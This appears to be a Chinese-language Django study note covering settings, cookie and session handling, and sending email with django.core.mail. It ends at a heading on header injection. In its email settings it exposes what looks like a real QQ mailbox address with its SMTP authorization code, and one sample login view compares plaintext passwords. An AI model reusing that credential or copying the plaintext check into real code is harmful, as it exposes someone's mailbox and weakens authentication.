如果将TIME_ZONE设置成了Asia/Shanghai,那么务必将USE_TZ改成False

43. WSGI_APPLICATION
默认None,Django的内置服务器(例如runserver)将使用的WSGI应用程序对象的完整Python路径,Django使用WSGI协议与外部进行通信。
django-admin startproject xxx命令创建的Django项目将自动创建一个简单的wsgi.py模块,里面有一个可调用的application变量,WSGI_APPLICATION配置项的值就指向这个application变量。

44. CACHES
默认{'default': {'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',}}
一个嵌套字典,包含所有缓存系统要使用的设置。
CACHES设置必须配置一个default缓存,还可以同时指定任何数量的附加缓存,也可以没有

以下是重要的内部配置项目:
BACKEND:要使用的缓存后端,内置高速缓存后端有:
'django.core.cache.backends.db.DatabaseCache'
'django.core.cache.backends.dummy.DummyCache'
'django.core.cache.backends.filebased.FileBasedCache'
'django.core.cache.backends.locmem.LocMemCache'
'django.core.cache.backends.memcached.MemcachedCache'
'django.core.cache.backends.memcached.PyLibMCCache'
通过将BACKEND设置为缓存后端类的完全限定路径(例如mypackage.backends.whatever.WhateverCache),可以使用第三方的缓存后端

LOCATION:
默认'',要使用的缓存的位置,可能是文件系统缓存的目录,内存缓存服务器的主机和端口,或只是本地内存缓存的标识名称

</pre><textarea>
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
    }
}

</textarea><pre>
OPTIONS:
默认None,传递到缓存后端的额外参数,可用参数因缓存后端而异。

TIMEOUT:
默认300,高速缓存的有效时间,值为None则缓存将永远不会过期。

VERSION:
默认1,Django服务器生成的缓存键的默认版本号。

45. AUTHENTICATION_BACKENDS
默认['django.contrib.auth.backends.ModelBackend'],在尝试验证用户时使用的认证后端的列表,默认使用Django自带的Auth框架。
AUTHENTICATION_BACKENDS = ('django.contrib.auth.backends.ModelBackend',)

46. AUTH_USER_MODEL
默认'auth.User',默认使用的User模型。

47. LOGIN_REDIRECT_URL
默认'/accounts/profile/',登录之后如果contrib.auth.login视图找不到next参数,请求将被重定向到该URL。

48. LOGIN_URL
默认'/accounts/login/',登录页面的URL。

49. LOGOUT_REDIRECT_URL
默认None,使用LogoutView视图退出登录后请求被重定向的URL,如果设置为None则不执行重定向。

50. PASSWORD_RESET_TIMEOUT_DAYS
默认3,重置密码的链接的有效期的天数,用于django.contrib.auth的密码重置功能。

51. PASSWORD_HASHERS
密码哈希使用的算法。
默认:
[
    'django.contrib.auth.hashers.PBKDF2PasswordHasher',
    'django.contrib.auth.hashers.PBKDF2SHA1PasswordHasher',
    'django.contrib.auth.hashers.Argon2PasswordHasher',
    'django.contrib.auth.hashers.BCryptSHA256PasswordHasher',
    'django.contrib.auth.hashers.BCryptPasswordHasher',
]

52. MESSAGE_LEVEL
默认messages.INFO,设置Django内置的消息框架message将记录的最低消息级别。

53. MESSAGE_STORAGE
默认'django.contrib.messages.storage.fallback.FallbackStorage',控制Django在哪里存储消息数据,有效值为:
'django.contrib.messages.storage.fallback.FallbackStorage'
'django.contrib.messages.storage.session.SessionStorage'
'django.contrib.messages.storage.cookie.CookieStorage'

54. SESSION_COOKIE_AGE
默认1209600(2个星期),会话Cookie的过期时间,以秒为单位。

55. SESSION_COOKIE_NAME
默认'sessionid',要用于会话的Cookie的名称。名字随意,只要与应用程序中的其他cookie名称不同。

56. SESSION_ENGINE
默认值:'django.contrib.sessions.backends.db',会话使用的后端即会话数据的保存位置,内置支持的引擎有:
'django.contrib.sessions.backends.db'
'django.contrib.sessions.backends.file'
'django.contrib.sessions.backends.cache'
'django.contrib.sessions.backends.cached_db'
'django.contrib.sessions.backends.signed_cookies'

57. SESSION_EXPIRE_AT_BROWSER_CLOSE
默认False,是否在用户关闭浏览器时过期会话。

58. SITE_ID
默认:未指定,当前站点在django_site数据库表中的ID,一个整数,从1开始计数。
Django是支持多站点同时运行的,通常都只有一个站点,所以不关心这个选项。如果同时运行了多个站点,那么每个app就得知道自己是为哪个或哪些站点服务的,这就需要SITE_ID参数了。

59. STATIC_ROOT
默认None,在DEBUG设置为False即线上环境时Django项目里的静态文件(js\css\plugins)会无法使用,这时需要运行python manage.py collectstatic,将静态文件统一收集到一个目录下,STATIC_ROOT配置的就是该目录的绝对路径。
示例:"/var/www/example.com/static/"
这个目录刚开始应该是一个空目录。

60. STATIC_URL
默认None,引用位于STATIC_ROOT中的静态文件时使用的网址。
示例:"/static/"或"http://static.example.com/"
该URL设置为非空值时必须以斜杠"/"结束。

61. STATICFILES_DIRS
默认[],定义额外的静态文件搜索地址。
例如STATICFILES_DIRS = ["/home/special.polls.com/polls/static", "/home/polls.com/polls/static", "/opt/webfiles/common",]
即使在Windows上这些路径也要使用Unix样式的正斜杠(例如"C:/Users/user/mysite/extra_static_content")

</pre>如果分不清MEDIA_ROOT、MEDIA_URL、STATIC_ROOT、STATIC_URL和STATICFILES_DIRS的区别,下面是一个参考版的设置<textarea>
STATIC_URL = '/static/'
STATICFILES_DIRS = [ os.path.join(BASE_DIR, "static"), ]
STATIC_ROOT = os.path.join(BASE_DIR, "all_static_files")

MEDIA_ROOT = os.path.join(BASE_DIR, 'media').replace("\\", "/")
MEDIA_URL = '/media/'

MEDIA_ROOT = os.path.join(BASE_DIR, 'upload/')
MEDIA_URL = '/upload/' #这个是在浏览器上访问该上传文件的url的前缀

</textarea>
</div>

<div id="django_cookie_session">
<h4>cookie</h4><pre>
获取Cookie
request.COOKIES['key']
request.get_signed_cookie(key, default=RAISE_ERROR, salt='', max_age=None)
参数：
default: 默认值
salt: 加密盐
max_age: 后台控制过期时间

设置Cookie
rep = HttpResponse(...)
rep ＝ render(request, ...)
rep ＝ redirect()

rep.set_cookie(key,value,...)
rep.set_signed_cookie(key,value,salt='加密盐',...)

参数
key,           键
value='',      值
max_age=None,  超长时间
expires=None,  超长时间
path='/',      Cookie生效的路径,浏览器只会把cookie回传给带有该路径的页面,这样可以避免将cookie传给站点中的其他的应用。/ 表示根路径,特殊的：根路径的cookie可以被任何url的页面访问
domain=None,  Cookie生效的域名,可用这个参数来构造一个跨站cookie,如domain=".example.com",所构造的cookie对下面这些站点都是可读的：www.example.com 、 www2.example.com和an.other.sub.domain.example.com,如果该参数设置为None则cookie只能由设置它的站点读取。
secure=False,   如果设置为True,浏览器将通过HTTPS来回传cookie。
httponly=False  只能http协议传输,无法被JavaScript获取,不是绝对,底层抓包可以获取到也可以被覆盖

由于cookie保存在客户端的电脑上,所以JavaScript和jquery也可以操作cookie
< script src='/static/js/jquery.cookie.js'>< /script>
$.cookie("key", value,{ path: '/' });

删除cookie
response.delete_cookie("cookie_key",path="/",domain=name)

cookie存储到客户端
优点：数据存在在客户端,减轻服务器端的压力,提高网站的性能。
缺点：安全性不高,在客户端机很容易被查看或破解用户会话信息

</pre>

<h4>会话session</h4><pre>
因为因特网HTTP协议的特性,每一次来自于用户浏览器的请求(request)都是无状态的、独立的,通俗地说就是无法保存用户状态,后台服务器根本就不知道当前请求和以前及以后请求是否来自同一用户。对于静态网站,这可能不是个问题,而对于动态网站,尤其是京东、天猫、银行等购物或金融网站,无法识别用户并保持用户状态是致命的,根本就无法提供服务。尝试将浏览器的cookie功能关闭会发现将无法在京东登录和购物。

为了保持连接状态,网站会通过用户的浏览器在用户机器内被限定的硬盘位置中写入一些数据,也就是所谓的Cookie。通过Cookie可以保存一些诸如用户名、浏览记录、表单记录、登录和注销等各种数据。但是这种方式非常不安全,因为Cookie保存在用户的机器上,如果Cookie被伪造、篡改或删除就会造成极大的安全威胁,因此现代网站设计通常将Cookie用来保存一些不重要的内容,实际的用户数据和状态还是以Session会话的方式保存在服务器端。

Session就是在服务器端的'Cookie',将用户数据保存在服务器端,远比保存在用户端要安全、方便和快捷得多。

Session依赖Cookie！但与Cookie不同的地方在于Session将所有的数据都放在服务器端,用户浏览器的Cookie中只会保存一个非明文的识别信息,比如哈希值。

Session是大多数网站都需要具备的功能,Django提供了一个通用的Session框架,并且可以使用多种session数据的保存方式:
1、保存在数据库内,通常情况没有特别需求的话,请使用保存在数据库内的方式,尽量不要保存到Cookie内
2、保存到缓存
3、保存到文件内
4、保存到cookie内

Django的session框架支持匿名会话,封装了cookies的发送和接收过程。cookie包含一个会话ID而不是数据本身(除非使用的是基于后端的cookie)。

Django的会话框架完全地、唯一地基于Cookie。它不像PHP一样,把会话的ID放在URL中。那样不仅使得URL变得丑陋,还使得网站易于受到通过"Referer"头部进行窃取会话ID的攻击。

一、启用会话
Django通过一个内置中间件来实现会话功能。要启用会话就要先启用该中间件。编辑settings.py中的MIDDLEWARE设置,确保存在django.contrib.sessions.middleware.SessionMiddleware,默认情况在新建的项目中它是存在的。

二、配置会话引擎
默认Django将会话数据保存在数据库内(通过使用django.contrib.sessions.models.Session模型),也可以将数据保存在文件系统或缓存内。

1. 基于数据库的会话
确保在INSTALLED_APPS设置中django.contrib.sessions的存在,然后运行manage.py migrate命令在数据库内创建sessions表。

sqlite> .schema django_session
CREATE TABLE IF NOT EXISTS "django_session" ("session_key" varchar(40) NOT NULL PRIMARY KEY, "session_data" text NOT NULL, "expire_date" datetime NOT NULL);
CREATE INDEX "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
sqlite> select * from django_session;
qclyzpaowo5vkwe8dlvjo9dxaglg8rlz|NTZmNDlhYTkxNTRiMmQwMTkzNDAzNWE5ZDI2MWJiNWRjOWNlOTJlYTp7Il9hdXRoX3VzZXJfaWQiOiIxIiwiX2F1dGhfdXNlcl9iYWNrZW5kIjoiZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5kcy5Nb2RlbEJhY2tlbmQiLCJfYXV0aF91c2VyX2hhc2giOiJjNTI0NWViYTUyMGJjMzFjYjk5NTUwZWRjMDYyNjlkY2EyYzQwYzU4In0=|2019-08-26 15:43:10.029985
87ustsrqw2l4fonu4odnipduq7qdb33g|NTZmNDlhYTkxNTRiMmQwMTkzNDAzNWE5ZDI2MWJiNWRjOWNlOTJlYTp7Il9hdXRoX3VzZXJfaWQiOiIxIiwiX2F1dGhfdXNlcl9iYWNrZW5kIjoiZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5kcy5Nb2RlbEJhY2tlbmQiLCJfYXV0aF91c2VyX2hhc2giOiJjNTI0NWViYTUyMGJjMzFjYjk5NTUwZWRjMDYyNjlkY2EyYzQwYzU4In0=|2019-08-29 00:29:54.053008

2. 基于缓存的会话
从性能角度考虑,基于缓存的会话会更好一些,但首先得先配置好缓存。
使用django的缓存系统来存储session需要确保已经配置了cache
如果定义有多个缓存,Django将使用默认的那个。如果想用其它的,请将SESSION_CACHE_ALIAS参数设置为那个缓存的名字。

配置好缓存后,可以选择两种保存数据的方法:
一是将SESSION_ENGINE设置为"django.contrib.sessions.backends.cache",简单的对会话进行保存。但是这种方法不是很可靠,因为当缓存数据存满时将清除部分数据,或者遇到缓存服务器重启时数据将丢失。
为了数据安全保障,可以将SESSION_ENGINE设置为"django.contrib.sessions.backends.cached_db"。这种方式在每次缓存的时候会同时将数据在数据库内写一份。当缓存不可用时,会话会从数据库内读取数据。
两种方法都很迅速,但是第一种简单的缓存更快一些,因为它忽略了数据的持久性。如果使用缓存+数据库的方式,还需要对数据库进行配置。

3. 基于文件的会话
将SESSION_ENGINE设置为"django.contrib.sessions.backends.file"。同时必须正确配置SESSION_FILE_PATH(默认使用tempfile.gettempdir()方法的返回值,就像/tmp目录),确保文件存储目录及Web服务器对该目录具有读写权限。

4. 基于cookie的会话
将SESSION_ENGINE设置为"django.contrib.sessions.backends.signed_cookies"。Django将使用加密签名工具和安全秘钥设置保存会话的cookie。
建议将SESSION_COOKIE_HTTPONLY设置为True,阻止javascript对会话数据的访问,提高安全性。

三、Using sessions in views
当会话中间件启用后,传递给视图request参数的HttpRequest对象将包含一个session属性,这个属性的值是一个类似字典的对象。
可以在视图的任何地方读写request.session属性

在模板文件中使用request.session
{{ request.session.user_name }}
{{ request }}这个变量会被默认传入模板中,可以通过圆点的调用方式,获取它内部的{{ request.session }},再进一步的获取session中的内容。其实{{ request }}中的数据远不止此,例如{{ request.path }}就可以获取先前的url地址

</pre><textarea>
def index(request):
    if not request.session.get('is_login', None):
        return redirect('/login/')
    return render(request, 'login/index.html')

</textarea><pre>
print([e for e in dir(request.session)])
['TEST_COOKIE_NAME', 'TEST_COOKIE_VALUE', '_SessionBase__not_given', '_SessionBase__session_key', '__class__', '__contains__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_get_new_session_key', '_get_or_create_session_key', '_get_session', '_get_session_from_db', '_get_session_key', '_hash', '_session', '_session_cache', '_session_key', '_set_session_key', '_validate_session_key', 'accessed', 'clear', 'clear_expired', 'create', 'create_model_instance', 'cycle_key', 'decode', 'delete', 'delete_test_cookie', 'encode', 'exists', 'flush', 'get', 'get_expire_at_browser_close', 'get_expiry_age', 'get_expiry_date', 'get_model_class', 'has_key', 'is_empty', 'items', 'keys', 'load', 'model', 'modified', 'pop', 'save', 'serializer', 'session_key', 'set_expiry', 'set_test_cookie', 'setdefault', 'test_cookie_worked', 'update', 'values']

class backends.base.SessionBase是所有会话对象的基类,包含标准的字典方法:
__getitem__(key)               # Example: fav_color = request.session['fav_color']
__setitem__(key, value)        # Example: request.session['fav_color'] = 'blue'
__delitem__(key)               # Example: del request.session['fav_color']  # 如果不存在会抛出异常
__contains__(key)              # Example: 'fav_color' in request.session
get(key, default=None)         # Example: fav_color = request.session.get('fav_color', 'red')
pop(key, default=__not_given)  # Example: fav_color = request.session.pop('fav_color', 'blue')

request.session.exists("session_key")
检查用户session的随机字符串在数据库中是否

类似字典数据类型的内置方法
keys()
items()
setdefault()
clear()

其他方法:
request.session.session_key
用户session的随机字符串

flush()
删除当前的会话数据和会话cookie,经常用在用户退出后删除会话

request.session.delete("session_key")
删除当前用户的所有Session数据

set_test_cookie()
设置一个测试cookie,用于探测用户浏览器是否支持cookies。由于cookie的工作机制,只有在下次用户请求的时候才可以测试

test_cookie_worked()
返回True或False,取决于用户的浏览器是否接受测试cookie,必须在之前先调用set_test_cookie()方法

delete_test_cookie()
删除测试cookie

set_expiry(value)
设置cookie的有效期,可以传递不同类型的参数值:
如果value是一个整数,session将在对应的秒数后失效,request.session.set_expiry(300)将在300秒后失效
如果value是一个datetime或timedelta对象,会话将在这个时间后失效
如果value为0,在用户关闭浏览器后失效
如果value为None,则将使用全局会话失效策略,session会依赖全局session失效策略
失效时间从上一次会话被修改的时刻开始计时。

get_expiry_age()
返回多少秒后失效的秒数。对于没有自定义失效时间的会话这等同于SESSION_COOKIE_AGE
这个方法接受2个可选的关键字参数
modification:会话的最后修改时间,datetime对象,默认是当前时间
expiry:会话失效信息,可以是datetime对象、int或None

get_expiry_date()
和上面的方法类似,只是返回的是日期

get_expire_at_browser_close()
返回True或False,根据用户会话是否是浏览器关闭后就结束。

clear_expired()
删除已经失效的会话数据
request.session.clear_expired()

cycle_key()
创建一个新的会话秘钥用于保持当前的会话数据,django.contrib.auth.login()会调用这个方法。

【 序列化会话 】
Django默认使用JSON序列化会话数据,可以在SESSION_SERIALIZER设置中自定义序列化格式,甚至写入警告说明。但强烈建议还是使用JSON,尤其是以cookie的方式进行会话时。

举个例子,一个使用pickle序列化会话数据的攻击场景。如果使用的是已签名的Cookie会话并且SECRET_KEY被攻击者知道了,攻击者就可以在会话中插入一个字符串,在pickle反序列化时可以在服务器上执行危险的代码。在因特网上这个攻击技术很简单并很容易使用。尽管Cookie会话会对数据进行签名以防止篡改,但SECRET_KEY的泄漏却使得一切前功尽弃。

内置的序列化方法
(1).class serializers.JSONSerializer
对django.core.signing中JSON序列化方法的一个包装,只可以序列化基本的数据类型,另外JSON只支持以字符串作为request.session字典的键值,使用其它的类型会导致异常。

>>> # initial assignment
>>> request.session[0] = 'bar'
>>> # subsequent requests following serialization & deserialization of session data
>>> request.session[0]     # KeyError
>>> request.session['0']   # 'bar'

同样,无法被JSON编码的,例如非UTF8格式的字节'\xd9'一样是无法被保存的,它会导致UnicodeDecodeError异常。

(2).class serializers.PickleSerializer
支持任意类型的Python对象,但如果攻击者知道了SECRET_KEY可能导致远端执行代码的漏洞

自定义序列化方法
自定义的序列化类必须分别实现dumps(self, obj)和loads(self, data)方法,用来实现序列化和反序列化会话数据字典。

【 会话使用中的一些建议 】
以一个下划线开始的会话字典的键被Django保留作为内部使用。
不要用新对象覆盖request.session,不要直接访问或设置它的属性,像一个Python字典一样的使用它。

</pre><textarea>
# 下面这个简单的视图在用户发表评论后,在session中设置一个has_commented变量为True,它不允许用户重复发表评论
def post_comment(request, new_comment):
    if request.session.get('has_commented', False):
        return HttpResponse("You've already commented.")
    c = comments.Comment(comment=new_comment)
    c.save()
    request.session['has_commented'] = True
    return HttpResponse('Thanks for your comment!')

# 用户登录视图:
def login(request):
    m = Member.objects.get(username=request.POST['username'])
    if m.password == request.POST['password']:
        request.session['member_id'] = m.id
        return HttpResponse("You're logged in.")
    else:
        return HttpResponse("Your username and password didn't match.")

# 退出登录的视图
# Django内置的django.contrib.auth.logout()函数实际上所做的内容比上面的例子要更严谨,以防止意外的数据泄露,它会调用request.session的flush()方法。使用这个例子只是演示如何利用会话对象来工作,而不是一个完整的logout()实现。
def logout(request):
    try:
        del request.session['member_id']
    except KeyError:
        pass
    return HttpResponse("You're logged out.")

</textarea><pre>
【 测试cookie 】
为了方便,Django提供一个简单的方法来测试用户的浏览器是否接受Cookie。只需在一个视图中调用request.session的set_test_cookie()方法,并在随后的视图中调用test_cookie_worked()获取测试结果,不能在同一个视图中调用这两个方法。
造成这种分割调用的原因是cookie的工作机制,当设置一个cookie时无法立刻得到结果,直到浏览器发送下一个请求时才能获得结果。
在测试后记得使用delete_test_cookie()方法清除测试数据。

</pre><textarea>
from django.http import HttpResponse
from django.shortcuts import render

def login(request):
    if request.method == 'POST':
        if request.session.test_cookie_worked():
            request.session.delete_test_cookie()
            return HttpResponse("You're logged in.")
        else:
            return HttpResponse("Please enable cookies and try again.")
    request.session.set_test_cookie()
    return render(request, 'foo/login_form.html')

</textarea><pre>
【 Using sessions out of views 】
下面的例子直接从django.contrib.sessions.backends.db中导入了SessionStore对象。实际代码中应该采用下面的导入方法,根据SESSION_ENGINE的设置进行导入
>>> from importlib import import_module
>>> from django.conf import settings
>>> SessionStore = import_module(settings.SESSION_ENGINE).SessionStore

在视图外可以通过下面的API操作会话数据:
>>> from django.contrib.sessions.backends.db import SessionStore
>>> s = SessionStore()
>>> s['last_login'] = 1376587691 # stored as seconds since epoch since datetimes are not serializable in JSON
>>> s.create()
>>> s.session_key    # '2b1189a188b44ad18c35e113ac6ceead'
>>> s = SessionStore(session_key='2b1189a188b44ad18c35e113ac6ceead')
>>> s['last_login']  # 1376587691

SessionStore.create()用于创建一个新的会话。save()方法用于保存一个已经存在的会话。create方法会调用save方法并循环直到生成一个未使用的session_key。直接调用save方法也可以创建一个新的会话,但在生成session_key的时候有可能和已经存在的发生冲突。

如果使用的是django.contrib.sessions.backends.db模式,那么每一个会话其实就是一个普通的Django模型,可以使用普通的Django数据库API访问它。会话模型的定义在django/contrib/sessions/models.py文件里
>>> from django.contrib.sessions.models import Session
>>> s = Session.objects.get(pk='2b1189a188b44ad18c35e113ac6ceead')
>>> s.expire_date  # datetime.datetime(2005, 8, 20, 13, 35, 12)

需要调用get_decoded()方法才能获得会话字典,因为字典是采用编码格式保存的
>>> s.session_data    # 'KGRwMQpTJ19hdXRoX3VzZXJfaWQnCnAyCkkxCnMuMTExY2ZjODI2Yj...'
>>> s.get_decoded()   # {'user_id': 42}

django.core.exceptions.ImproperlyConfigured: Requested setting DEFAULT_INDEX_TABLESPACE, but settings are not configured. You must either define the environment variable DJANGO_SETTINGS_MODULE or call settings.configure() before accessing settings.
解决方法如下:在代码文件的最上方,添加如下代码:
import os, django
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "project_name.settings") # project_name项目名称
django.setup()

六、会话的保存机制
默认只有当会话字典的某个值被重新设置或删除时Django才会将会话内容保存到会话数据库内。
request.session['foo'] = 'bar'         # 会话被修改
del request.session['foo']             # 会话被删除
request.session['foo'] = {}            # 会话被删除
request.session['foo']['bar'] = 'baz'  # 会话没有被修改,只是修改了request.session['foo']

可以通过设置会话对象的modified属性值,显式地告诉会话对象它已经被修改过:request.session.modified = True。

要改变上面的默认行为,将SESSION_SAVE_EVERY_REQUEST设置为True,那么每一次单独的请求过来,Django都会保存会话到数据库。
会话的Cookie只有在一个会话被创建或修改后才会再次发送。如果SESSION_SAVE_EVERY_REQUEST为True,每次请求都会发送cookie。
类似地,会话Cookie的失效部分在每次发送会话Cookie时都会更新。
如果响应的状态码为500,则会话不会被保存。

七、会话生存期
默认SESSION_EXPIRE_AT_BROWSER_CLOSE设置为False,即cookie保存在用户的浏览器内直到失效日期,这样用户就不必每次打开浏览器后都要再登录一次。
相反的,如果将SESSION_EXPIRE_AT_BROWSER_CLOSE设置为True,则意味着浏览器一关闭cookie就失效,每次重新打开浏览器就得重新登录。
这个设置是一个全局的默认值,可以通过显式地调request.session的set_expiry()方法来覆盖
有些浏览器如Chrome具有在关闭后重新打开浏览器会话依然保持的功能。这会与Django的SESSION_EXPIRE_AT_BROWSER_CLOSE设置发生冲突,要小心。

八、清除已保存的会话
随着用户的访问,会话数据会越来越庞大。如果使用的是数据库保存模式,那么django_session表的内容会逐渐增长。如果使用的是文件模式,那么临时目录内的文件数量会不断增加。
造成这个问题的原因是,如果用户手动退出登录,Django将会自动删除会话数据,但是如果用户不退出登录,那么对应的会话数据不会被删除。
Django没有提供自动清除失效会话的机制,因此必须自己完成这项工作。但是Django提供了一个命令clearsessions用于清除会话数据,建议基于这个命令设置一个周期性的自动清除机制,比如crontab或Windows的调度任务。

不同的是,使用缓存模式的会话不需要清理数据,因为缓存系统自己有清理过期数据的机制。使用cookie模式的会话也不需要,因为数据都存在用户的浏览器内,不用帮忙。

九、会话的相关设置
下面是Django的session相关设置,用于帮助控制会话的行为,大多数在前面都介绍过了:
SESSION_CACHE_ALIAS
SESSION_COOKIE_AGE
SESSION_COOKIE_DOMAIN
SESSION_COOKIE_HTTPONLY
SESSION_COOKIE_NAME
SESSION_COOKIE_PATH
SESSION_COOKIE_SECURE
SESSION_ENGINE
SESSION_EXPIRE_AT_BROWSER_CLOSE
SESSION_FILE_PATH
SESSION_SAVE_EVERY_REQUEST
SESSION_SERIALIZER

session 存储的相关配置
数据库配置(默认)
Django 默认支持 Session,并且默认是将 Session 数据存储在数据库中,即：django_session 表中。
配置 settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.db'   # 引擎(默认)
SESSION_COOKIE_NAME ＝ "sessionid"                       # Session的cookie保存在浏览器上时的key,即：sessionid＝随机字符串(默认)
SESSION_COOKIE_PATH ＝ "/"                               # Session的cookie保存的路径(默认)
SESSION_COOKIE_DOMAIN = None                             # Session的cookie保存的域名(默认)
SESSION_COOKIE_SECURE = False                            # 是否Https传输cookie(默认)
SESSION_COOKIE_HTTPONLY = True                           # 是否Session的cookie只支持http传输(默认)
SESSION_COOKIE_AGE = 1209600                             # Session的cookie失效日期(2周)(默认)
SESSION_EXPIRE_AT_BROWSER_CLOSE = False                  # 是否关闭浏览器使得Session过期(默认)
SESSION_SAVE_EVERY_REQUEST = False                       # 是否每次请求都保存Session,默认修改之后才保存(默认)

缓存配置
配置 settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.cache'  # 引擎
SESSION_CACHE_ALIAS = 'default'                            # 使用的缓存别名(默认内存缓存,也可以是memcache),此处别名依赖缓存的设置
SESSION_COOKIE_NAME ＝ "sessionid"                        # Session的cookie保存在浏览器上时的key,即：sessionid＝随机字符串
SESSION_COOKIE_PATH ＝ "/"                                # Session的cookie保存的路径
SESSION_COOKIE_DOMAIN = None                              # Session的cookie保存的域名
SESSION_COOKIE_SECURE = False                             # 是否Https传输cookie
SESSION_COOKIE_HTTPONLY = True                            # 是否Session的cookie只支持http传输
SESSION_COOKIE_AGE = 1209600                              # Session的cookie失效日期(2周)
SESSION_EXPIRE_AT_BROWSER_CLOSE = False                   # 是否关闭浏览器使得Session过期
SESSION_SAVE_EVERY_REQUEST = False                        # 是否每次请求都保存Session,默认修改之后才保存

文件配置
配置 settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.file'    # 引擎
SESSION_FILE_PATH = None                                    # 缓存文件路径,如果为None,则使用tempfile模块获取一个临时地址tempfile.gettempdir()
SESSION_COOKIE_NAME ＝ "sessionid"                          # Session的cookie保存在浏览器上时的key,即：sessionid＝随机字符串
SESSION_COOKIE_PATH ＝ "/"                                  # Session的cookie保存的路径
SESSION_COOKIE_DOMAIN = None                                # Session的cookie保存的域名
SESSION_COOKIE_SECURE = False                               # 是否Https传输cookie
SESSION_COOKIE_HTTPONLY = True                              # 是否Session的cookie只支持http传输
SESSION_COOKIE_AGE = 1209600                                # Session的cookie失效日期(2周)
SESSION_EXPIRE_AT_BROWSER_CLOSE = False                     # 是否关闭浏览器使得Session过期
SESSION_SAVE_EVERY_REQUEST = False                          # 是否每次请求都保存Session,默认修改之后才保存

十、SessionStore对象
在会话内部Django使用一个与会话引擎对应的会话保存对象SessionStore,位于SESSION_ENGINE设置指定的模块内。
所有Django支持的SessionStore类都继承SessionBase类,并实现了下面的数据操作方法:
exists()
create()
save()
delete()
load()
clear_expored()

为了创建一个自定义会话引擎或修改一个现成的引擎,需要创建一个新的类,它继承SessionBase类或任何其他已经存在的SessionStore类。

</pre>
</div>

<div id="django_email">
<h4>Django发送邮件</h4><pre>
Python内置smtp邮件发送模块,Django在此基础上进行了简单地封装,在Django环境中可以更方便更灵活的发送邮件,所有的功能都在django.core.mail中

默认使用配置文件中的EMAIL_HOST和EMAIL_PORT设置SMTP服务器主机和端口,EMAIL_HOST_USER和EMAIL_HOST_PASSWORD是用户名和密码。如果设置了EMAIL_USE_TLS和EMAIL_USE_SSL,它们将控制是否使用相应的加密链接。

settings文件中邮件相关的settings配置:
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'  # 指定发送邮件的后端模块
EMAIL_HOST = 'smtp.sina.com'                                   # 发送方的smtp服务器地址,建议使用新浪
EMAIL_PORT = 25                                                # smtp服务端口,默认为25
EMAIL_HOST_USER = 'xxx@sina.com'                               # 在发送服务器的用户名
EMAIL_HOST_PASSWORD = 'xxxxxxxxxxx'                            # 对应用户的密码

# 发送邮件设置
# https://docs.djangoproject.com/en/2.0/ref/settings/#email
# https://docs.djangoproject.com/en/2.0/topics/email/
EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'smtp.qq.com'
EMAIL_PORT = 25
EMAIL_HOST_USER = '2872402050@qq.com'
EMAIL_HOST_PASSWORD = 'wyejaniudikedfbb'  # 授权码
EMAIL_SUBJECT_PREFIX = '[杨仕航的博客] '
EMAIL_USE_TLS = True  # 与SMTP服务器通信时,是否启动TLS链接(安全链接)

某些邮件公司可能不开放smtp服务
某些公司要求使用ssl安全机制
某些smtp服务对主机名格式有要求

【 单发send_mail() 】
from django.core.mail import send_mail
send_mail(subject, message, from_email, recipient_list, fail_silently=False, auth_user=None, auth_password=None, connection=None, html_message=None)
send_mail('Subject here', 'Here is the message.', 'from@example.com', ['to@example.com'], fail_silently=False)
send_mail()方法返回值将是成功发送出去的邮件数量0或1,因为它只能发送一封邮件
其中的subject、message、from_email和recipient_list参数是必须的,其它的可选。
subject:邮件主题,字符串。
message:邮件具体内容,字符串。
from_email:邮件发送方,需要和settings中的一致,字符串。
recipient_list:收件人邮箱地址组成的字符串列表,其中每一个成员都会在邮件信息的"To:"区域看到其它成员。
fail_silently: 一个布尔值。如果它是False,send_mail发送失败时将会引发一个smtplib.SMTPException异常。
auth_user: 可选的用户名用来验证SMTP服务器,默认使用settings中EMAIL_HOST_USER的值
auth_password: 可选的密码用来验证SMTP服务器,默认使用settings中EMAIL_HOST_PASSWORD的值
connection: 可选的用来发送邮件的电子邮件后端。
html_message: 发送带HTML代码的邮件。

</pre><textarea>
# 在项目根目录下新建一个send_mail.py文件
import os
from django.core.mail import send_mail

os.environ['DJANGO_SETTINGS_MODULE'] = 'mysite.settings'

if __name__ == '__main__':
    send_mail(
        '来自www.liujiangblog.com的测试邮件',
        '欢迎访问www.liujiangblog.com,这里是博客和教程站点,本站专注于Python、Django和机器学习技术的分享！',
        'xxx@sina.com',
        ['xxx@qq.com'],
    )

</textarea><pre>
由于当前是单独运行send_mail.py文件,无法自动链接Django环境,需要通过os模块对环境变量进行设置,也就是:
os.environ['DJANGO_SETTINGS_MODULE'] = 'mysite.settings'
运行send_mail.py文件,不是运行Django服务器,然后到目的地邮箱查看邮件是否收到

【 群发send_mass_mail() 】
send_mass_mail(datatuple,fail_silently = False,auth_user = None,auth_password = None,connection = None)
send_mass_mail()用来处理大批量邮件任务即群发,返回成功发送的邮件数量
参数datatuple是必需参数,接收一个元组,元组的每个元素的格式如下:
(subject, message, from_email, recipient_list)

每调用一次send_mail(),它会和SMTP服务器建立一次连接,也就是发一次连一次,效率很低。而send_mass_mail(),则只建立一次链接,就将所有的邮件都发送出去,效率比较高。

向两组不同的收件人发送两个不同的消息,但只能打开一个到邮件服务器的连接
message1 = ('Subject here', 'Here is the message', 'from@example.com', ['first@example.com', 'other@example.com'])
message2 = ('Another Subject', 'Here is another message', 'from@example.com', ['second@test.com'])
send_mass_mail((message1, message2), fail_silently=False)

【 防止头部注入攻击 】
